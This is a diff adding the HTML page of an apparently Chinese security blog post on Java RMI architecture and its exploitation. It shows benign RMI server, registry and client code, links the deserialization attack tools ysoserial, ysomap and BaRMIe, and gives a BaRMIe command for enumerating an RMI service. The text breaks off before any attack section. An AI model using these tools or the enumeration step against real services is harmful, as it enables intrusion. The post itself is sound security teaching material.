@@ -1,0 +1,1426 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+    <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
+    <meta charset="UTF-8" />
+
+    <meta name="generator" content="Hugo 0.88.1" /><meta name="theme-color" content="#16171d" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
+    
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+
+    <title>Java RMI分析与利用 | MYZXCG</title>
+
+    <link rel="stylesheet" href="/css/meme.min.ee7d92038178eda958210f69458541e2686ada11055b93762d6d324f2acc47c5.css"/>
+
+    
+    
+        <script src="/js/meme.min.4194bf2034241e3757fbbbf5fe4db43d0ff17c81f4496e6bc931504f0978cbd2.js"></script>
+
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" media="print" onload="this.media='all'" />
+        <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" /></noscript>
+
+    <meta name="author" content="myzxcg" /><meta name="description" content="Java提供了一种RPC框架 RMI(Remote Method Invocation , 远程方法调用) 。RMI指的是一种行为、一个过程。……" />
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-title" content="MYZXCG" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="application-name" content="MYZXCG" />
+    <meta name="msapplication-starturl" content="../../../" />
+    <meta name="msapplication-TileColor" content="#603cba" />
+    <meta name="msapplication-TileImage" content="../../../icons/mstile-150x150.png" />
+    <link rel="manifest" href="/manifest.json" />
+
+
+    
+    
+
+    
+    <link rel="canonical" href="https://myzxcg.com/2021/10/Java-RMI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/" />
+    
+
+<script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "datePublished": "2021-10-25T00:00:45+08:00",
+        "dateModified": "2021-11-20T14:06:57+08:00",
+        "url": "https://myzxcg.com/2021/10/Java-RMI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/",
+        "headline": "Java RMI分析与利用",
+        "description": "Java提供了一种RPC框架 RMI(Remote Method Invocation , 远程方法调用) 。RMI指的是一种行为、一个过程。……",
+        "inLanguage" : "zh-CN",
+        "articleSection": "posts",
+        "wordCount":  5003 ,
+        "image": ["https://myzxcg.com/images/1635065158.png","https://myzxcg.com/images/1635065209.png","https://myzxcg.com/images/1635065384.png","https://myzxcg.com/images/1635065494.png"],
+        "author": {
+            "@type": "Person",
+            "description": "专注于Web安全、内网渗透. 记录学习与渗透过程中遇到的有意思的点, 分享技巧与知识. 欢迎交流～",
+            "email": "myzx.xcg@gmail.com",
+            "image": "https://myzxcg.com/avatar.png",
+            "url": "https://myzxcg.com/",
+            "name": "myzxcg"
+        },
+        "license": "[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)",
+        "publisher": {
+            "@type": "Organization",
+            "name": "MYZXCG",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "https://myzxcg.com/icons/favicon.ico"
+            },
+            "url": "https://myzxcg.com/"
+        },
+        "mainEntityOfPage": {
+            "@type": "WebSite",
+            "@id": "https://myzxcg.com/"
+        }
+    }
+</script>
+
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+
+
+<meta name="twitter:site" content="@myzxcg" />
+<meta name="twitter:creator" content="@myzxcg" />
+
+    
+
+
+
+<meta property="og:title" content="Java RMI分析与利用" />
+<meta property="og:description" content="Java提供了一种RPC框架 RMI(Remote Method Invocation , 远程方法调用) 。RMI指的是一种行为、一个过程。……" />
+<meta property="og:url" content="https://myzxcg.com/2021/10/Java-RMI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/" />
+<meta property="og:site_name" content="MYZXCG" />
+<meta property="og:locale" content="zh" /><meta property="og:image" content="https://myzxcg.com/images/1635065158.png" />
+<meta property="og:type" content="article" />
+    <meta property="article:published_time" content="2021-10-25T00:00:45&#43;08:00" />
+    <meta property="article:modified_time" content="2021-11-20T14:06:57&#43;08:00" />
+    
+    <meta property="article:section" content="posts" />
+
+
+        <link rel="preconnect" href="https://www.google-analytics.com" crossorigin />
+
+        
+
+
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-Y0LZRMN44V"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-Y0LZRMN44V');
+    </script>
+
+
+
+
+    
+    
+
+    
+</head>
+
+    <body>
+        <div class="container">
+            
+    <header class="header">
+        
+            <div class="header-wrapper">
+                <div class="header-inner single">
+                    
+    <div class="site-brand">
+        
+            <a href="/" class="brand">MYZXCG</a>
+        
+    </div>
+
+                    <nav class="nav">
+    <ul class="menu" id="menu">
+        
+            
+        
+        
+        
+        
+            
+                <li class="menu-item"><a href="/archives/"><span class="menu-item-name">文章</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/tags/"><span class="menu-item-name">标签</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/about/"><span class="menu-item-name">关于</span></a>
+                </li>
+            
+        
+            
+                
+                    
+                    
+                
+            
+        
+            
+                
+            
+        
+    </ul>
+</nav>
+
+                    
+                </div>
+            </div>
+            
+    <input type="checkbox" id="nav-toggle" aria-hidden="true" />
+    <label for="nav-toggle" class="nav-toggle"></label>
+    <label for="nav-toggle" class="nav-curtain"></label>
+
+
+        
+    </header>
+
+
+
+
+            
+            
+    <main class="main single" id="main">
+    <div class="main-inner">
+
+        
+
+        <article class="content post h-entry" data-align="justify" data-type="posts" data-toc-num="true">
+
+            <h1 class="post-title p-name">Java RMI分析与利用</h1>
+
+            
+
+            
+                
+            
+
+            
+                
+
+<div class="post-meta">
+    
+        
+        <time datetime="2021-10-25T00:00:45&#43;08:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2021.10.25</time>
+    
+    
+    
+    
+        
+        
+        
+            
+        
+    
+    
+    
+        
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;10&nbsp;分钟</span>
+    
+
+   
+    
+
+    
+    
+</div>
+
+            
+
+            <nav class="contents">
+  <h2 id="contents" class="contents-title">目录</h2><ol class="toc">
+    <li><a id="contents:rmi-结构" href="#rmi-结构">RMI 结构</a>
+      <ol>
+        <li><a id="contents:数据传输过程" href="#数据传输过程">数据传输过程</a></li>
+        <li><a id="contents:rmi-服务端" href="#rmi-服务端">RMI 服务端</a></li>
+        <li><a id="contents:rmi-客户端" href="#rmi-客户端">RMI 客户端</a></li>
+      </ol>
+    </li>
+    <li><a id="contents:攻击面" href="#攻击面">攻击面</a>
+      <ol>
+        <li><a id="contents:客户端攻击服务端" href="#客户端攻击服务端">客户端攻击服务端</a></li>
+        <li><a id="contents:服务端攻击客户端" href="#服务端攻击客户端">服务端攻击客户端</a></li>
+        <li><a id="contents:客户端攻击注册中心" href="#客户端攻击注册中心">客户端攻击注册中心</a></li>
+        <li><a id="contents:服务端攻击注册中心" href="#服务端攻击注册中心">服务端攻击注册中心</a></li>
+        <li><a id="contents:注册中心攻击客户端或服务端" href="#注册中心攻击客户端或服务端">注册中心攻击客户端(或服务端)</a></li>
+      </ol>
+    </li>
+    <li><a id="contents:jep290-绕过" href="#jep290-绕过"><strong>JEP290</strong> 绕过</a>
+      <ol>
+        <li><a id="contents:unicastref-bypass-jep290" href="#unicastref-bypass-jep290">UnicastRef Bypass JEP290</a></li>
+      </ol>
+    </li>
+    <li><a id="contents:参考" href="#参考">参考</a></li>
+  </ol>
+</nav><div class="post-body e-content">
+                <blockquote>
+<p>Java提供了一种RPC框架 RMI(Remote Method Invocation , 远程方法调用) 。RMI指的是一种行为、一个过程。通过RMI允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。Java本身对RMI规范的实现默认使用的是JRMP协议（ Java远程消息交换协议，就像HTTP是实现Web访问使用的协议一样）。而在Weblogic中对RMI规范的实现使用T3协议。</p>
+</blockquote>
+<h2 id="rmi-结构"><a href="#rmi-结构" class="anchor-link">#</a><a href="#contents:rmi-结构" class="headings">RMI 结构</a></h2>
+<p><strong>RMI分为三部分</strong></p>
+<ul>
+<li>RMI Registry 注册中心，存放着远程对象的位置（ip、端口、标识符）</li>
+<li>RMI Server 服务端，提供远程的对象</li>
+<li>RMI Client 客户端，调用远程的对象</li>
+</ul>
+<h3 id="数据传输过程"><a href="#数据传输过程" class="anchor-link">#</a><a href="#contents:数据传输过程" class="headings">数据传输过程</a></h3>
+<p><img src="/images/1635065158.png" alt=""></p>
+<p>在这个过程中，Server到RMI Registry（步骤2）、Client与RMI Registry的双向通信（步骤3、4）和Client与Server的双向通信（步骤6、9），这三个过程数据传输都要经过<code>序列化/反序列化</code>的操作。</p>
+<p><strong>通信过程梳理:</strong> 客户端⾸先连接Registry，并在其中寻找Name是hello的对象。然后Registry返回一个序列化的数据（Hello对象的初始引用）。这个hello对象是由一个动态代理生成的类，包含与Server通信的IP和端口。Client与该地址进行连接，在该连接中才真正调用远程⽅法。</p>
+<p><img src="/images/1635065209.png" alt=""></p>
+<p><em><strong>Tips:</strong></em> RMI Registry就像一个⽹关，其自身是不会执行远程方法的。但RMI Server可以在上⾯注册⼀个Name到对象的绑定关系。RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接 RMI Server。最后远程方法实际上在RMI Server上执行调⽤。</p>
+<h3 id="rmi-服务端"><a href="#rmi-服务端" class="anchor-link">#</a><a href="#contents:rmi-服务端" class="headings">RMI 服务端</a></h3>
+<p>定义一个远程接口，在定义远程接口的时候需要继承<code>java.rmi.Remote</code>接口并且修饰符需要为public。在定义的方法里需要抛出一个<code>RemoteException</code>异常。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">rmiserver</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.rmi.Remote</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">interface</span> <span class="nc">user</span> <span class="kd">extends</span> <span class="n">Remote</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">hello</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>远程接口的实现类，需要将该实现类继承<code>UnicastRemoteObject</code>。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">rmiserver</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.server.UnicastRemoteObject</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">userhello</span> <span class="kd">extends</span> <span class="n">UnicastRemoteObject</span> <span class="kd">implements</span> <span class="n">user</span><span class="o">{</span>
+    <span class="kd">protected</span> <span class="nf">userhello</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;构造方法&#34;</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">hello</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;hello方法被调用&#34;</span><span class="o">);</span>
+        <span class="k">return</span> <span class="s">&#34;hello,world&#34;</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>创建服务器实例，创建一个注册中心并将对象注册到注册中心。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">rmiserver</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.Registry</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">serverstart</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">userhello</span> <span class="n">hello</span> <span class="o">=</span><span class="k">new</span> <span class="n">userhello</span><span class="o">();</span>
+            <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="n">1099</span><span class="o">);</span><span class="c1">//创建注册表
+</span><span class="c1"></span>            <span class="n">registry</span><span class="o">.</span><span class="na">rebind</span><span class="o">(</span><span class="s">&#34;hello&#34;</span><span class="o">,</span><span class="n">hello</span><span class="o">);</span> <span class="c1">//将远程对象注册到注册表里面，并且设置值为hello
+</span><span class="c1"></span>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h3 id="rmi-客户端"><a href="#rmi-客户端" class="anchor-link">#</a><a href="#contents:rmi-客户端" class="headings">RMI 客户端</a></h3>
+<p>调用远程对象的方法</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">rmiserver</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.Registry</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">client</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span><span class="o">{</span>
+            <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">(</span><span class="s">&#34;localhost&#34;</span><span class="o">,</span> <span class="n">1099</span><span class="o">);</span><span class="c1">//获取远程主机对象
+</span><span class="c1"></span>            <span class="c1">//利用注册表的代理去查询远程注册表中名为hello的对象 ，服务器会序列化该对象再传输到客户端
+</span><span class="c1"></span>            <span class="n">user</span> <span class="n">hello</span> <span class="o">=</span> <span class="o">(</span><span class="n">user</span><span class="o">)</span> <span class="n">registry</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">&#34;hello&#34;</span><span class="o">);</span>
+            <span class="c1">// 调用远程方法hello()
+</span><span class="c1"></span>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">hello</span><span class="o">.</span><span class="na">hello</span><span class="o">());</span>
+        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>如果远程的这个方法有参数的话，调用该方法传入的参数必须是可序列化的。传输序列化后的数据，服务端会对客户端的输入进行反序列化。</p>
+<h2 id="攻击面"><a href="#攻击面" class="anchor-link">#</a><a href="#contents:攻击面" class="headings">攻击面</a></h2>
+<p>工具利用： <a href="https://github.com/NickstaDB/BaRMIe" target="_blank" rel="noopener">BaRMIe</a> 、<a href="https://github.com/wh1t3p1g/ysomap" target="_blank" rel="noopener">ysomap</a>  、 <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a></p>
+<p>探测RMI服务: <code>java -jar BaRMIe_v1.01.jar -enum 127.0.0.1 9527</code></p>
+<p><strong>测试代码</strong></p>
+<p>user接口</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">rmi</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.rmi.Remote</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">interface</span> <span class="nc">user</span> <span class="kd">extends</span> <span class="n">Remote</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">hello</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>user实现类</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">rmi</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.server.UnicastRemoteObject</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">userhello</span> <span class="kd">extends</span> <span class="n">UnicastRemoteObject</span> <span class="kd">implements</span> <span class="n">user</span><span class="o">{</span>
+    <span class="kd">protected</span> <span class="nf">userhello</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;构造方法&#34;</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">hello</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;hello方法被调用&#34;</span><span class="o">);</span>
+        <span class="k">return</span> <span class="s">&#34;hello,world&#34;</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>注册中心</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">rmi</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">registry</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="n">1099</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">RemoteException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+        <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>服务端</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">rmi</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.rmi.AlreadyBoundException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.Registry</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">server</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">(</span><span class="n">1099</span><span class="o">);</span>
+            <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">&#34;hello&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">userhello</span><span class="o">());</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">RemoteException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">AlreadyBoundException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p><em><strong>Tips:</strong></em> 在低版本的JDK中，Server与Registry可以不在同一台服务器上。而在高版本的JDK中，Server与Registry只能在同一台服务器上，否则无法注册成功。（Bind()函数会检查）</p>
+<p>客户端</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">rmi</span><span class="o">;</span>
+
